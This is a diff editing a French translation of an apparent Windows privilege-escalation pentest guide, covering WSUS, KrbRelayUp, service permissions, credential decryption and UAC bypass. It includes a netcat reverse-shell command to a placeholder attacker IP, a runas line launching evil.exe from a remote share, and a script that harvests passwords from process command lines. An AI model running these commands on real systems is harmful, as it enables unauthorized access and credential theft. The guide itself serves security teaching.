@@ -110,11 +110,11 @@ dir C:\Transcripts
 Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
-### PowerShell Module Logging
+### Journalisation des modules PowerShell
 
 Les détails des exécutions de pipeline PowerShell sont enregistrés, englobant les commandes exécutées, les invocations de commandes et des parties de scripts. Cependant, les détails d'exécution complets et les résultats de sortie peuvent ne pas être capturés.
 
-Pour activer cela, suivez les instructions dans la section "Fichiers de transcription" de la documentation, en choisissant **"Module Logging"** au lieu de **"Powershell Transcription"**.
+Pour activer cela, suivez les instructions dans la section "Fichiers de transcription" de la documentation, en optant pour **"Journalisation des modules"** au lieu de **"Transcription PowerShell"**.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
@@ -135,7 +135,7 @@ reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Script
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
 Les événements de journalisation pour le Script Block peuvent être trouvés dans le Windows Event Viewer à l'emplacement : **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
-Pour voir les 20 derniers événements, vous pouvez utiliser :
+Pour afficher les 20 derniers événements, vous pouvez utiliser :
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
@@ -154,20 +154,33 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 Vous pouvez compromettre le système si les mises à jour ne sont pas demandées en utilisant http**S** mais http.
 
-Vous commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant ce qui suit :
+Vous commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant ce qui suit dans cmd :
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
-Si vous recevez une réponse telle que :
+Ou le suivant en PowerShell :
+```
+Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
+```
+Si vous recevez une réponse comme l'une de celles-ci :
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
 ```
-Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` est égal à `1`.
+
+```bash
+WUServer     : http://xxxx-updxx.corp.internal.com:8530
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
+PSChildName  : windowsupdate
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+```
+Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.
 
 Alors, **il est exploitable.** Si le dernier registre est égal à 0, alors, l'entrée WSUS sera ignorée.
 
-Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils comme : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ce sont des scripts d'exploits armés MiTM pour injecter des mises à jour 'fausses' dans le trafic WSUS non-SSL.
+Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils comme : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ce sont des scripts d'exploits MiTM armés pour injecter des mises à jour 'fausses' dans le trafic WSUS non-SSL.
 
 Lisez la recherche ici :
 
@@ -188,7 +201,7 @@ Vous pouvez exploiter cette vulnérabilité en utilisant l'outil [**WSUSpicious*
 
 ## KrbRelayUp
 
-Une vulnérabilité de **montée de privilèges locale** existe dans les environnements **domaines** Windows sous des conditions spécifiques. Ces conditions incluent des environnements où **la signature LDAP n'est pas appliquée,** les utilisateurs possèdent des droits leur permettant de configurer **Resource-Based Constrained Delegation (RBCD),** et la capacité pour les utilisateurs de créer des ordinateurs au sein du domaine. Il est important de noter que ces **exigences** sont satisfaites en utilisant les **paramètres par défaut**.
+Une vulnérabilité de **montée de privilèges locale** existe dans les environnements **domaines** Windows sous des conditions spécifiques. Ces conditions incluent des environnements où **la signature LDAP n'est pas appliquée,** les utilisateurs possèdent des droits leur permettant de configurer la **Délégation Contraignante Basée sur les Ressources (RBCD),** et la capacité pour les utilisateurs de créer des ordinateurs au sein du domaine. Il est important de noter que ces **exigences** sont satisfaites en utilisant les **paramètres par défaut**.
 
 Trouvez l'**exploit dans** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
@@ -218,7 +231,7 @@ Juste exécutez le binaire créé pour élever les privilèges.
 
 ### MSI Wrapper
 
-Lisez ce tutoriel pour apprendre à créer un wrapper MSI en utilisant ces outils. Notez que vous pouvez envelopper un "**.bat**" si vous **voulez juste** **exécuter** **des lignes de commande**.
+Lisez ce tutoriel pour apprendre à créer un wrapper MSI en utilisant ces outils. Notez que vous pouvez envelopper un "**.bat**" si vous **voulez juste** **exécuter** des **lignes de commande**.
 
 {{#ref}}
 msi-wrapper.md
@@ -257,7 +270,7 @@ Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/lo
 
 ### Paramètres d'Audit
 
-Ces paramètres décident de ce qui est **journalisé**, donc vous devriez faire attention.
+Ces paramètres décident ce qui est **journalisé**, donc vous devriez faire attention.
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
@@ -269,7 +282,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ```
 ### LAPS
 
-**LAPS** est conçu pour la **gestion des mots de passe des administrateurs locaux**, garantissant que chaque mot de passe est **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés en toute sécurité dans Active Directory et ne peuvent être consultés que par des utilisateurs ayant reçu des autorisations suffisantes via des ACL, leur permettant de voir les mots de passe administratifs locaux si autorisés.
+**LAPS** est conçu pour la **gestion des mots de passe des administrateurs locaux**, garantissant que chaque mot de passe est **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés en toute sécurité dans Active Directory et ne peuvent être consultés que par des utilisateurs ayant reçu des autorisations suffisantes via des ACL, leur permettant de voir les mots de passe des administrateurs locaux si autorisés.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -358,9 +371,9 @@ powershell -command "Get-Clipboard"
 ```
 ## Exécution des processus
 
-### Permissions des fichiers et dossiers
+### Permissions des fichiers et des dossiers
 
-Tout d'abord, lister les processus **vérifie la présence de mots de passe dans la ligne de commande du processus**.\
+Tout d'abord, lister les processus **vérifie les mots de passe à l'intérieur de la ligne de commande du processus**.\
 Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture dans le dossier binaire pour exploiter d'éventuelles [**attaques de détournement de DLL**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
@@ -372,7 +385,7 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Vérifiez toujours les [**débogueurs electron/cef/chromium** possibles en cours d'exécution, vous pourriez en abuser pour élever les privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Vérifiez toujours la présence de [**débogueurs electron/cef/chromium** en cours d'exécution, vous pourriez en abuser pour élever les privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
 **Vérification des permissions des binaires des processus**
 ```bash
@@ -435,8 +448,8 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 Si vous avez cette erreur (par exemple avec SSDPSRV) :
 
-_Erreur système 1058 s'est produite._\
-_Le service ne peut pas être démarré, soit parce qu'il est désactivé, soit parce qu'il n'a pas de périphériques activés qui lui sont associés._
+_L'erreur système 1058 s'est produite._\
+_Le service ne peut pas être démarré, soit parce qu'il est désactivé, soit parce qu'il n'a pas de périphériques activés associés._ 
 
 Vous pouvez l'activer en utilisant
 ```bash
@@ -566,11 +579,11 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
-### Permissions d'écriture
+### Écrit Permissions
 
 Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier spécial ou si vous pouvez modifier un binaire qui va être exécuté par un compte Administrateur (schedtasks).
 
-Une façon de trouver des permissions de dossiers/fichiers faibles dans le système est de faire :
+Une façon de trouver des permissions de dossier/fichiers faibles dans le système est de faire :
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -636,7 +649,7 @@ net share #Check current shares
 ```
 ### fichier hosts
 
-Vérifiez d'autres ordinateurs connus codés en dur dans le fichier hosts.
+Vérifiez d'autres ordinateurs connus codés en dur dans le fichier hosts
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -664,7 +677,7 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
 ### Règles de Pare-feu
 
-[**Consultez cette page pour les commandes liées au Pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**
+[**Vérifiez cette page pour les commandes liées au Pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**
 
 Plus[ de commandes pour l'énumération réseau ici](../basic-cmd-for-pentesters.md#network)
 
@@ -721,7 +734,7 @@ Vous pouvez ensuite utiliser `runas` avec l'option `/savecred` afin d'utiliser l
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Utiliser `runas` avec un ensemble de credentials fourni.
+Utiliser `runas` avec un ensemble de credentials fournis.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
@@ -756,7 +769,7 @@ dpapi-extracting-passwords.md
 
 ### Identifiants PowerShell
 
-Les **identifiants PowerShell** sont souvent utilisés pour des **scripts** et des tâches d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.
+Les **identifiants PowerShell** sont souvent utilisés pour des tâches de **script** et d'automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.
 
 Pour **déchiffrer** un identifiant PS à partir du fichier qui le contient, vous pouvez faire :
 ```powershell
@@ -886,7 +899,7 @@ $ErrorActionPreference = $OrigError
 ### SCClient / SCCM
 
 Vérifiez si `C:\Windows\CCM\SCClient.exe` existe.\
-Les installateurs sont **exécutés avec des privilèges SYSTEM**, beaucoup sont vulnérables à **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Les installateurs sont **exécutés avec des privilèges SYSTEM**, beaucoup sont vulnérables au **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
@@ -908,7 +921,7 @@ Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\So
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Si vous trouvez une entrée dans ce chemin, il s'agira probablement d'une clé SSH sauvegardée. Elle est stockée de manière chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Si vous trouvez une entrée à l'intérieur de ce chemin, il s'agira probablement d'une clé SSH sauvegardée. Elle est stockée de manière chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
 Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
 Si le service `ssh-agent` n'est pas en cours d'exécution et que vous souhaitez qu'il démarre automatiquement au démarrage, exécutez :
@@ -978,7 +991,7 @@ Recherchez un fichier appelé **SiteList.xml**
 
 ### Cached GPP Pasword
 
-Une fonctionnalité était auparavant disponible qui permettait le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via les Préférences de stratégie de groupe (GPP). Cependant, cette méthode présentait des failles de sécurité significatives. Premièrement, les Objets de stratégie de groupe (GPO), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par tout utilisateur de domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre aux utilisateurs d'obtenir des privilèges élevés.
+Une fonctionnalité était auparavant disponible qui permettait le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via les Préférences de stratégie de groupe (GPP). Cependant, cette méthode présentait des failles de sécurité significatives. Tout d'abord, les Objets de stratégie de groupe (GPO), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par tout utilisateur de domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre aux utilisateurs d'obtenir des privilèges élevés.
 
 Pour atténuer ce risque, une fonction a été développée pour scanner les fichiers GPP mis en cache localement contenant un champ "cpassword" qui n'est pas vide. Lorsqu'un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l'emplacement du fichier, aidant à l'identification et à la remédiation de cette vulnérabilité de sécurité.
 
@@ -1176,7 +1189,7 @@ Les classes et interfaces COM sont définies dans le registre sous **HKEY\_**_**
 
 ![](<../../images/image (729).png>)
 
-En gros, si vous pouvez **écraser l'une des DLL** qui vont être exécutées, vous pourriez **escalader les privilèges** si cette DLL doit être exécutée par un autre utilisateur.
+En gros, si vous pouvez **écraser l'une des DLL** qui vont être exécutées, vous pourriez **escalader les privilèges** si cette DLL doit être exécutée par un utilisateur différent.
 
 Pour apprendre comment les attaquants utilisent le détournement COM comme mécanisme de persistance, consultez :
 
@@ -1227,19 +1240,19 @@ Then, if you have **full access to the low privileged process**, you can grab th
 
 ## Named Pipe Client Impersonation
 
-Shared memory segments, referred to as **pipes**, enable process communication and data transfer.
+Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.
 
-Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.
+Windows fournit une fonctionnalité appelée **Named Pipes**, permettant à des processus non liés de partager des données, même sur des réseaux différents. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **named pipe server** et **named pipe client**.
 
-When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).
+Lorsque des données sont envoyées par un **client** à travers un pipe, le **serveur** qui a configuré le pipe a la capacité de **prendre l'identité** du **client**, à condition qu'il dispose des droits nécessaires **SeImpersonate**. Identifier un **processus privilégié** qui communique via un pipe que vous pouvez imiter offre une opportunité de **gagner des privilèges plus élevés** en adoptant l'identité de ce processus une fois qu'il interagit avec le pipe que vous avez établi. Pour des instructions sur l'exécution d'une telle attaque, des guides utiles peuvent être trouvés [**here**](named-pipe-client-impersonation.md) et [**here**](#from-high-integrity-to-system).
 
-Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Aussi, l'outil suivant permet de **intercepter une communication de named pipe avec un outil comme burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et voir tous les pipes pour trouver des privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Misc
 
 ### **Monitoring Command Lines for passwords**
 
-When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
+Lorsque vous obtenez un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus en cours d'exécution qui **passent des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l'état actuel avec l'état précédent, affichant les différences.
 ```powershell
 while($true)
 {
@@ -1301,7 +1314,7 @@ Vous avez tous les fichiers et informations nécessaires dans le dépôt GitHub 
 
 https://github.com/jas502n/CVE-2019-1388
 
-## De l'administrateur à un niveau d'intégrité élevé / Contournement de l'UAC
+## De l'administrateur niveau d'intégrité moyen à élevé / Contournement UAC
 
 Lisez ceci pour **en savoir plus sur les niveaux d'intégrité** :
 
@@ -1309,7 +1322,7 @@ Lisez ceci pour **en savoir plus sur les niveaux d'intégrité** :
 integrity-levels.md
 {{#endref}}
 
-Ensuite, **lisez ceci pour en savoir plus sur l'UAC et les contournements de l'UAC :**
+Ensuite, **lisez ceci pour en savoir plus sur UAC et les contournements UAC :**
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
@@ -1319,7 +1332,7 @@ Ensuite, **lisez ceci pour en savoir plus sur l'UAC et les contournements de l'U
 
 ### **Nouveau service**
 
-Si vous exécutez déjà un processus à intégrité élevée, le **passage à SYSTEM** peut être facile en **créant et en exécutant un nouveau service** :
+Si vous exécutez déjà un processus à haute intégrité, le **passage à SYSTEM** peut être facile en **créant et en exécutant un nouveau service** :
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
@@ -1335,7 +1348,7 @@ Depuis un processus à haute intégrité, vous pourriez essayer d'**activer les 
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-Si vous avez ces privilèges de jeton (vous les trouverez probablement dans un processus déjà à haute intégrité), vous pourrez **ouvrir presque n'importe quel processus** (pas de processus protégés) avec le privilège SeDebug, **copier le jeton** du processus, et créer un **processus arbitraire avec ce jeton**.\
+Si vous avez ces privilèges de jeton (vous les trouverez probablement dans un processus à haute intégrité déjà), vous pourrez **ouvrir presque n'importe quel processus** (pas de processus protégés) avec le privilège SeDebug, **copier le jeton** du processus, et créer un **processus arbitraire avec ce jeton**.\
 Utiliser cette technique consiste généralement à **sélectionner n'importe quel processus s'exécutant en tant que SYSTEM avec tous les privilèges de jeton** (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges de jeton_).\
 **Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**
 
@@ -1347,7 +1360,7 @@ Si vous voulez lire un exemple de [**comment passer d'une haute intégrité à S
 
 ### Dll Hijacking
 
-Si vous parvenez à **détourner une dll** étant **chargée** par un **processus** s'exécutant en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, le Dll Hijacking est également utile pour ce type d'escalade de privilèges, et, de plus, il est **beaucoup plus facile à réaliser depuis un processus à haute intégrité** car il aura **des permissions d'écriture** sur les dossiers utilisés pour charger les dll.\
+Si vous parvenez à **détourner une dll** étant **chargée** par un **processus** s'exécutant en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, le Dll Hijacking est également utile pour ce type d'escalade de privilèges, et, de plus, il est **beaucoup plus facile à réaliser depuis un processus à haute intégrité** car il aura **des permissions d'écriture** sur les dossiers utilisés pour charger des dlls.\
 **Vous pouvez** [**en savoir plus sur le Dll hijacking ici**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
